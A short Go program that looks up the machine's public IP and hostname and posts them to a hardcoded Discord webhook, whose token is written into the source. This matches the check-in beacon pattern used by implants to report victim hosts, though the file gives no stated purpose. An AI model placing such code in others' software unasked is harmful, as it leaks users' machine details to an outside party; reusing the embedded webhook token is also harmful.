package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func main() {

	webhookURL := "https://discord.com/api/webhooks/860332001756053546/N9TMEZeMUYN9omeMx64WHTfwOy-hKI0qZbI0QWBAhW4_uii5OFUbZwq9XETPfiqG2mxZ"

	resp, err := http.Get("http://ifconfig.me/ip")
	if err != nil {
		log.Fatalln(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	sb := string(body)

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalln(err)
	}

	postBody, _ := json.Marshal(map[string]string{
		"content": "**Hostname :**" + " `" + hostname + "`" + "\n**IP :**" + " `" + sb + "`",
	})
	responseBody := bytes.NewBuffer(postBody)

	http.Post(webhookURL, "application/json", responseBody)

	fmt.Println(hostname, sb)
}
